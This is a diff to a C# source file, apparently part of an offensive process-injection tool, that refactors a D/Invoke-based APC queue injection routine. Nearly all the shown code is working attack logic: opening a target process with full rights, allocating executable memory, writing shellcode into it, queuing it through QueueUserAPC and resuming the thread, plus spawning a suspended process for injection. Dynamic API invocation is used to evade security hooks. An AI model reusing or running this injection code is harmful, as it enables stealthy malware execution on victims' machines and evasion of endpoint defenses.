@@ -1,7 +1,12 @@
-﻿using ProcessInjection.DInvoke.Native;
+﻿using ProcessInjection.Native;
 using System;
 using System.Runtime.InteropServices;
 using static ProcessInjection.Utils.Utils;
+using static ProcessInjection.Native.Enum;
+using static ProcessInjection.Native.Structs;
+using static ProcessInjection.Native.Delegates;
+using static ProcessInjection.Native.Constants;
+
 namespace ProcessInjection.DInvoke
 {
     public class APCQueue
@@ -15,15 +20,15 @@ namespace ProcessInjection.DInvoke
             {
                 PrintInfo($"[+] Obtaining the handle for the process id {pid}.");
                 var funcParams = new object[] {
-                    (uint)DInvoke.Native.Enum.ProcessAccessRights.All,
+                    (uint)ProcessAccessRights.All,
                     false,
                     (uint)pid
                 };
 
-                var pHandle = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                var pHandle = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "OpenProcess",
-                    typeof(DInvoke.Native.Delegates.OpenProcess),
+                    typeof(OpenProcess),
                     ref funcParams,
                     true);
 
@@ -35,14 +40,14 @@ namespace ProcessInjection.DInvoke
                     pHandle,
                     IntPtr.Zero,
                     (uint)buf.Length,
-                    (uint)DInvoke.Native.Enum.MemAllocation.MEM_RESERVE | (uint)DInvoke.Native.Enum.MemAllocation.MEM_COMMIT, 
-                    (uint)DInvoke.Native.Enum.MemProtect.PAGE_EXECUTE_READWRITE
+                    (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, 
+                    (uint)MemProtect.PAGE_EXECUTE_READWRITE
                 };
 
-                var rMemAddress = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                var rMemAddress = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "VirtualAllocEx",
-                    typeof(DInvoke.Native.Delegates.VirtualAllocEx),
+                    typeof(VirtualAllocEx),
                     ref funcParams,
                     true);
 
@@ -59,10 +64,10 @@ namespace ProcessInjection.DInvoke
                     lpNumberOfBytesWritten
                 };
 
-                var status = (bool)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                var status = (bool)DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "WriteProcessMemory",
-                    typeof(DInvoke.Native.Delegates.WriteProcessMemory),
+                    typeof(WriteProcessMemory),
                     ref funcParams,
                     true);
 
@@ -71,15 +76,15 @@ namespace ProcessInjection.DInvoke
                     PrintInfo($"[+] Shellcode written in the process memory.");
 
                     funcParams = new object[] {
-                        DInvoke.Native.Enum.ThreadAccess.THREAD_ALL,
+                        ThreadAccess.THREAD_ALL,
                         false, 
                         (uint)threadid
                     };
 
-                    var tHandle = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                    var tHandle = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                         "kernel32.dll",
                         "OpenThread",
-                        typeof(DInvoke.Native.Delegates.OpenThread),
+                        typeof(OpenThread),
                         ref funcParams,
                         true);
 
@@ -91,10 +96,10 @@ namespace ProcessInjection.DInvoke
                         IntPtr.Zero
                     };
 
-                    var ptr = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                    var ptr = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                         "kernel32.dll",
                         "QueueUserAPC",
-                        typeof(DInvoke.Native.Delegates.QueueUserAPC),
+                        typeof(QueueUserAPC),
                         ref funcParams,
                         true);
 
@@ -104,10 +109,10 @@ namespace ProcessInjection.DInvoke
                         tHandle
                     };
 
-                    DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                    DynamicInvoke.DynamicApiInvoke(
                         "kernel32.dll",
                         "ResumeThread",
-                        typeof(DInvoke.Native.Delegates.ResumeThread),
+                        typeof(ResumeThread),
                         ref funcParams,
                         true);
 
@@ -122,10 +127,10 @@ namespace ProcessInjection.DInvoke
                     pHandle
                     };
 
-                var closed = DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                var closed = DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "CloseHandle",
-                    typeof(DInvoke.Native.Delegates.CloseHandle),
+                    typeof(CloseHandle),
                     ref funcParams,
                     true);
             }
@@ -149,10 +154,10 @@ namespace ProcessInjection.DInvoke
 
             var procInfo = new Structs.PROCESS_INFORMATION();
 
-            var siEx = new DInvoke.Native.Structs.STARTUPINFOEX();
+            var siEx = new STARTUPINFOEX();
 
-            var ps = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
-            var ts = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
+            var ps = new SECURITY_ATTRIBUTES();
+            var ts = new SECURITY_ATTRIBUTES();
 
             var funcParams = new object[]
                 {
@@ -161,21 +166,21 @@ namespace ProcessInjection.DInvoke
                     ps,
                     ts,
                     false,
-                    DInvoke.Native.Constants.CreateSuspended,
+                    CreateSuspended,
                     IntPtr.Zero,
                     null,
                     siEx,
                     procInfo
                 };
 
-            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+            DynamicInvoke.DynamicApiInvoke(
                 "kernel32.dll",
                 "CreateProcessA",
-                typeof(DInvoke.Native.Delegates.CreateProcess),
+                typeof(CreateProcess),
                 ref funcParams,
                 true);
 
-            procInfo = (DInvoke.Native.Structs.PROCESS_INFORMATION)funcParams[9];
+            procInfo = (PROCESS_INFORMATION)funcParams[9];
 
             PrintInfo($"[!] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");
 
